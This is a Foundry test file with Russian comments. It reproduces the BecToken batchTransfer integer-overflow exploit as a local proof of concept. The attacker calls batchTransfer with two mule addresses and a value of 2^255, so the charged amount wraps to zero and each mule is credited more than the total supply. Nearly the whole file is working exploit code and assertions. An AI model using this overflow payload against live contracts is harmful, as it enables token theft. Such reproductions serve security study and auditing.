// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

/// @dev Минимальный интерфейс к BecToken. Сам контракт написан на solidity 0.4.16,
///      поэтому мы не импортируем его напрямую (несовместимые pragma), а деплоим
///      скомпилированный артефакт через deployCode и общаемся через этот интерфейс.
interface IBecToken {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function balanceOf(address who) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function batchTransfer(address[] calldata receivers, uint256 value) external returns (bool);
}

contract BecHack is Test {
    IBecToken bec;

    address owner = address(this); // деплоер получает весь totalSupply
    address attacker = address(0xA77ACC);
    address mule1 = address(0xBEEF1); // подставные адреса атакующего
    address mule2 = address(0xBEEF2);

    function setUp() public {
        // BecToken.sol компилируется своим solc (0.4.16), деплоим байткод артефакта.
        bec = IBecToken(deployCode("BecToken.sol:BecToken"));

        // Даём атакующему совсем маленький баланс — как обычному пользователю.
        bec.transfer(attacker, 1e18); // 1 BEC
    }

    function test_BatchTransferOverflow() public {
        uint256 totalSupply = bec.totalSupply();

        // Исходное состояние.
        assertEq(bec.balanceOf(attacker), 1e18, "attacker starts with 1 BEC");
        assertEq(bec.balanceOf(mule1), 0);
        assertEq(bec.balanceOf(mule2), 0);

        // --- ПОДБОР ЗНАЧЕНИЙ ДЛЯ ПЕРЕПОЛНЕНИЯ ---
        // batchTransfer: amount = cnt * _value  (обычное умножение, без SafeMath!)
        // Берём cnt = 2 получателя и _value = 2^255.
        // amount = 2 * 2^255 = 2^256, что в uint256 = 0 (переполнение).
        // Значит require(balances[msg.sender] >= amount) => require(balance >= 0) — всегда true.
        // При этом каждому получателю прибавляется _value = 2^255 «из воздуха».
        uint256 huge = 2 ** 255;

        address[] memory receivers = new address[](2);
        receivers[0] = mule1;
        receivers[1] = mule2;

        // amount, который посчитает контракт, действительно переполняется в 0.
        unchecked {
            uint256 amount = uint256(receivers.length) * huge;
            assertEq(amount, 0, "cnt * _value overflows to 0");
        }

        // Атакующий вызывает уязвимую функцию.
        vm.prank(attacker);
        bec.batchTransfer(receivers, huge);

        // --- РЕЗУЛЬТАТ ЭКСПЛОЙТА ---
        // Каждый подставной адрес получил по 2^255 токенов из ничего.
        assertEq(bec.balanceOf(mule1), huge, "mule1 minted 2^255 out of thin air");
        assertEq(bec.balanceOf(mule2), huge, "mule2 minted 2^255 out of thin air");

        // Баланс атакующего почти не изменился (списался amount = 0).
        assertEq(bec.balanceOf(attacker), 1e18, "attacker balance untouched");

        // Каждый из двух адресов теперь богаче всего легитимного totalSupply.
        assertGt(bec.balanceOf(mule1), totalSupply);
        assertGt(bec.balanceOf(mule2), totalSupply);

        console2.log("totalSupply (legit) :", totalSupply);
        console2.log("mule1 balance       :", bec.balanceOf(mule1));
        console2.log("mule2 balance       :", bec.balanceOf(mule2));
        console2.log("attacker paid       :", 1e18 - bec.balanceOf(attacker));
    }
}
